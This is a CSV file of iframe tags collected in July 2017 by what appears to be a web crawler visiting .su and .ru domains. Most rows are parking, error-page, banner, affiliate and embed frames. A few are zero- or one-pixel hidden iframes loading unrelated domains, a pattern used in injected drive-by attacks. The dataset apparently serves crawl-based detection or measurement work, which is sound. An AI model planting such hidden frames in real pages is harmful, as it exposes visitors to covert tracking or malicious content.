Index,Iframe,domain,filename
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://dobrava.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8441_20170729_111824/html_200_20170729_111824.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://vallox.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_9279_20170729_071712/html_200_20170729_071712.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://internet-casino.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_6386_20170729_085811/html_200_20170729_085811.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://glesox.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_6876_20170729_020408/html_200_20170729_020408.txt
0,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",http://land-design.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_6482_20170729_063720/html_200_20170729_063720.txt
0,"<iframe frameborder=""0"" height=""100"" src=""https://music.yandex.ru/iframe/#track/10770737/1169451/"" style=""border: none; width: 600px; height: 100px;"" width=""600"">_ <a href=""https://music.yandex.ru/album/1169451/track/10770737"">From Roots to Needles</a>  <a href=""https://music.yandex.ru/artist/1699763"">If These Trees Could Talk</a> _ __._</iframe>",http://read-me.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_5440_20170729_033840/html_200_20170729_033840.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://sbig.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1127_20170729_023514/html_200_20170729_023514.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://land.lptracker.ru/?ref=28365&amp;ip=209.249.157.102user_agent=Mozilla%2F5.0+%28compatible%3B+MSIE+8.0%3B+Windows+NT+6.1%3B+Trident%2F4.0%3B+GTB7.4%3B+InfoPath.2%3B+SV1%3B+.NET+CLR+3.3.69573%3B+WOW64%3B+en-US%29&amp;utm_source=&amp;utm_campaign=&amp;utm_term=&amp;utm_content=&amp;referer="" style=""padding:0px; margin:0px;"" width=""100%""></iframe>",http://call-tracking.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_4158_20170729_105939/html_200_20170729_105939.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://vodoleytula.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_6067_20170729_070446/html_200_20170729_070446.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://overlive.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_2231_20170729_015655/html_200_20170729_015655.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/new/"" width=""100%""></iframe>",http://smaga.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_5029_20170729_014527/html_200_20170729_014527.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/locked/"" width=""100%""></iframe>",http://procrastination.su/cgi-sys/suspendedpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1479_20170729_053311/html_200_20170729_053311.txt
1,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",http://severia.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8607_20170729_075324/html_200_20170729_075324.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://audi-khabarovsk.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_7498_20170729_013948/html_200_20170729_013948.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://audi-ivanovo.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_2538_20170729_032412/html_200_20170729_032412.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://xn----7sbghedaxvekfjjba8ajdu0c.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_170_20170729_025717/html_200_20170729_025717.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://sdiv.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_2665_20170729_010156/html_200_20170729_010156.txt
0,"<iframe allowtransparency=""true"" frameborder=""no"" height=""22"" scrolling=""no"" src=""http://monitoringminecraft.ru/status-iframe2n/178.33.43.45%3A25565.png#%5B1.8%20-%201.12%5D%20IP%3A%20mc.FunnyCraft.su%20%D0%BE%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD%20"" width=""480""></iframe>",http://funnycraft.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_853_20170729_070741/html_200_20170729_070741.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://putpay.org/site/38132649s866289p1385"" width=""100%""></iframe>",http://yoursenderpro.ru/aff/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1927_20170729_085142/html_200_20170729_085142.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/new/"" width=""100%""></iframe>",http://belova.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_3419_20170729_110343/html_200_20170729_110343.txt
0,"<iframe src=""http://www.domains4sale.ru/cgi-bin/ab.cgi?russianhome.su""></iframe>",http://russianhome.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_9054_20170729_082951/html_200_20170729_082951.txt
0,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",https://diez.su/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_3637_20170729_094850/html_200_20170729_094850.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://verniikonu.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_6997_20170729_101052/html_200_20170729_101052.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://goodlook.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_477_20170729_104356/html_200_20170729_104356.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/locked/"" width=""100%""></iframe>",http://tserv.su/cgi-sys/suspendedpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_9549_20170729_043755/html_200_20170729_043755.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://newpost.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_4170_20170729_013350/html_200_20170729_013350.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://putpay.org/site/38132649s866289p1385"" width=""100%""></iframe>",http://yoursenderpro.ru/aff/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_4531_20170729_103530/html_200_20170729_103530.txt
0,"<iframe height=""0"" src=""http://www.advantshop.net/appoffline.aspx"" style=""border:none"" width=""0""></iframe>",http://thermobile.su/app_offline.html,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_6945_20170729_120820/html_200_20170729_120820.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://gadalki.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_4288_20170729_124104/html_200_20170729_124104.txt
0,"<iframe src=""http://www.domains4sale.ru/cgi-bin/ab.cgi?cities.su""></iframe>",http://cities.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8341_20170729_125656/html_200_20170729_125656.txt
0,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",http://richwell.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_4243_20170729_130504/html_200_20170729_130504.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://putpay.org/site/38132649s866289p1385"" width=""100%""></iframe>",http://yoursenderpro.ru/aff/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_2092_20170729_071151/html_200_20170729_071151.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://audi-astrakhan.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8542_20170729_022927/html_200_20170729_022927.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/new/"" width=""100%""></iframe>",http://kcs.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8031_20170729_132519/html_200_20170729_132519.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://cybershop.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_7452_20170729_064305/html_200_20170729_064306.txt
0,"<iframe src=""http://promodj.com/list"" style=""border: 0; width: 100%; height: 100%""><a href=""http://promodj.com/list"">__ ___</a></iframe>",http://djlist.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_7109_20170729_053044/html_200_20170729_053044.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://trafindex.ru/aud/1488/x196"" width=""100%"">			  _ ___ iFrame		</iframe>",http://p-parks.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_9776_20170729_052455/html_200_20170729_052455.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://xn--80ahc.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1707_20170729_042735/html_200_20170729_042735.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://putpay.org/site/38132649s866289p1385"" width=""100%""></iframe>",http://yoursenderpro.ru/aff/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8621_20170729_081531/html_200_20170729_081531.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=nespresso.su&amp;pid=9PO755G95""></iframe>",http://nespresso.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_2807_20170729_060233/html_200_20170729_060233.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://audi-primorsky.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_6455_20170729_054145/html_200_20170729_054145.txt
0,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",http://cpg.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1281_20170729_060715/html_200_20170729_060715.txt
0,"<iframe src=""http://www.domains4sale.ru/cgi-bin/ab.cgi?motel.su""></iframe>",http://motel.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_5247_20170729_032553/html_200_20170729_032553.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://audi-vladimir.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_4922_20170729_113020/html_200_20170729_113020.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://hatsan.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_7402_20170729_073612/html_200_20170729_073612.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://kstar.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_5822_20170729_115428/html_200_20170729_115428.txt
0,"<iframe async="""" frameborder=""0"" height=""50px"" horizontalscrolling=""no"" scrolling=""no"" src=""https://tgwidget.com/widget/count/?id=5907a5f183ba8884028b4567"" verticalscrolling=""no"" width=""160px""></iframe>",http://smithy.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_5326_20170729_110908/html_200_20170729_110908.txt
0,"<iframe src=""http://www.domains4sale.ru/cgi-bin/ab.cgi?nation.su""></iframe>",http://nation.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_572_20170729_065443/html_200_20170729_065443.txt
0,"<iframe src=""http://www.domains4sale.ru/cgi-bin/ab.cgi?publisher.su""></iframe>",http://publisher.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_2551_20170729_035905/html_200_20170729_035905.txt
0,"<iframe src=""http://milbiz-clab.ru/79vJgw2""></iframe>",http://babysafelock.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_7011_20170729_013349/html_200_20170729_013349.txt
3,"<iframe class=""wp-embedded-content"" data-secret=""m9aqqAFlFi"" frameborder=""0"" height=""338"" marginheight=""0"" marginwidth=""0"" sandbox=""allow-scripts"" scrolling=""no"" security=""restricted"" src=""http://gmpnews.ru/2016/12/na-baze-bioximika-sozdaetsya-centr-po-razrabotke-novyx-vidov-antibiotikov/embed/#?secret=m9aqqAFlFi"" style=""position: absolute; clip: rect(1px, 1px, 1px, 1px);"" title=""  ___ _ _ _ __ ___ ___ _____  ___ GMP.  _ ____  ____ __ __"" width=""600""></iframe>",http://antibiotics.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_4754_20170729_024418/html_200_20170729_024418.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://audi-kaluga.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_6099_20170729_092802/html_200_20170729_092802.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://nomer8.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_6776_20170729_044657/html_200_20170729_044657.txt
1,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",http://electrocube.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_5712_20170729_055742/html_200_20170729_055742.txt
0,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",http://ur-konsult.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_22_20170729_094229/html_200_20170729_094229.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://egeist.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1096_20170729_080410/html_200_20170729_080410.txt
0,"<iframe src=""http://www.domains4sale.ru/cgi-bin/ab.cgi?visitor.su""></iframe>",http://visitor.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8318_20170729_093005/html_200_20170729_093005.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://clgr.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_9829_20170729_014220/html_200_20170729_014220.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://audi-novokuznetsk.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_2205_20170729_060407/html_200_20170729_060407.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://audi-primorskiy.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1367_20170729_015839/html_200_20170729_015839.txt
0,"<iframe height=""200"" src=""http://www.itm-katalog.ru/Informer/conv_ero.php?ind=eur"" width=""600""> </iframe>",http://tripit.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8261_20170729_024616/html_200_20170729_024616.txt
0,"<iframe src=""http://www.domains4sale.ru/cgi-bin/ab.cgi?saudi-arabia.su""></iframe>",http://saudi-arabia.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8087_20170729_070733/html_200_20170729_070733.txt
0,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",http://service-apple.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_5457_20170729_025620/html_200_20170729_025620.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://c-market.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8268_20170729_104148/html_200_20170729_104148.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://putpay.org/site/38132649s866289p1385"" width=""100%""></iframe>",http://yoursenderpro.ru/aff/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_2722_20170729_043922/html_200_20170729_043922.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://audi-habarovsk.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1344_20170729_093223/html_200_20170729_093223.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://land.lptracker.ru/?ref=13368&amp;ip=209.249.157.102user_agent=Mozilla%2F5.0+%28compatible%3B+MSIE+8.0%3B+Windows+NT+6.1%3B+Trident%2F4.0%3B+GTB7.4%3B+InfoPath.2%3B+SV1%3B+.NET+CLR+3.3.69573%3B+WOW64%3B+en-US%29&amp;utm_source=&amp;utm_campaign=&amp;utm_term=&amp;utm_content=&amp;referer="" style=""padding:0px; margin:0px;"" width=""100%""></iframe>",http://crmlptracker.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_5482_20170729_114105/html_200_20170729_114105.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://audi-cherepovets.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8485_20170729_072340/html_200_20170729_072340.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://vip-zzakazz.ru/shop-sale/?ref=4916&amp;lnk=1375583"" width=""100%""></iframe>",http://wowshop.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_3342_20170729_095245/html_200_20170729_095245.txt
0,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",http://malamut.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_3780_20170729_133032/html_200_20170729_133032.txt
0,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",http://zimnitsa.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_5818_20170729_100302/html_200_20170729_100302.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://perfomans.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_4925_20170729_020853/html_200_20170729_020853.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://putpay.org/site/38132649s866289p1385"" width=""100%""></iframe>",http://yoursenderpro.ru/aff/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_7438_20170729_060931/html_200_20170729_060931.txt
0,"<iframe src=""http://www.domains4sale.ru/cgi-bin/ab.cgi?emirate.su""></iframe>",http://emirate.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8786_20170729_022227/html_200_20170729_022227.txt
0,"<iframe frameborder=""0"" height=""1"" scrolling=""no"" src=""http://crm.masterlead.ru/api/counter/1349/?api_key=54c67e&amp;channel=0&amp;subid=&amp;prx=&amp;key_phrase="" width=""1""></iframe>",http://yurist-online.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_2468_20170729_050252/html_200_20170729_050252.txt
0,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",http://ckc.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8353_20170729_122721/html_200_20170729_122721.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=diman.su&amp;pid=9PO755G95""></iframe>",http://diman.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_4159_20170729_124651/html_200_20170729_124651.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://putpay.org/site/38132649s866289p1385"" width=""100%""></iframe>",http://yoursenderpro.ru/aff/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_7967_20170729_093226/html_200_20170729_093226.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://amuragro.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_3914_20170729_073059/html_200_20170729_073059.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/locked/"" width=""100%""></iframe>",http://tyga.su/cgi-sys/suspendedpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1979_20170729_072141/html_200_20170729_072141.txt
0,"<iframe border=""0"" height=""100%"" src=""http://superdiski.info/beztabletok/VIG2014"" width=""100%""></iframe>",http://yourhealer.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_5525_20170729_024103/html_200_20170729_024103.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://putpay.org/site/38132649s866289p1385"" width=""100%""></iframe>",http://yoursenderpro.ru/aff/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_9279_20170729_005851/html_200_20170729_005851.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://putpay.org/site/38132649s866289p1385"" width=""100%""></iframe>",http://yoursenderpro.ru/aff/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_9808_20170729_122132/html_200_20170729_122132.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://mediaexpert.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_2964_20170729_073108/html_200_20170729_073108.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://putpay.org/site/38132649s866289p1385"" width=""100%""></iframe>",http://yoursenderpro.ru/aff/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1378_20170729_071853/html_200_20170729_071853.txt
0,"<iframe frameborder=""0"" height=""0"" src=""http://anisimov-mikhail.ru/"" width=""0""></iframe>",http://orexi.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_3076_20170729_055357/html_200_20170729_055357.txt